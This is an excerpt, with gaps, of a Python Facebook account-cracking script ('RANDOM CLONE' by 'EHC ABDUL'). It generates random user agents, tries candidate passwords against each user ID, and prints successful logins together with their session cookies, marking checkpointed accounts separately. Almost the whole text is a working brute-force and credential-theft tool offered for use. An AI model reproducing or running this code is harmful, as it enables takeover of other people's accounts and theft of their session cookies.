...
for xd in range(10000):
    ...
    ugen.append(uaku2)
logo = ("""
 \033[1;92m  ______ _______  ___   ___  ___  __  ____ 
  / __/ // / ___/ / _ | / _ )/ _ \/ / / / / 
 / _// _  / /__  / __ |/ _  / // / /_/ / /__
/___/_//_/\___/ /_/ |_/____/____/\____/____/                                            
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mEHC ABDUL                  ┃
 ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
 ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                                     ┃
 ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
 ┃ [✓] GITHUB    \033[1;91m: \033[1;92mabdul07543                 ┃
 ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92m😈Md Abdul 😈              ┃
 ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m01827443725                ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mA-B-D-U-L😈\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[A-B-D-U-L😈-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[A-B-D-U-L😓-CP] {cid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[A-B-D-U-L😈] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
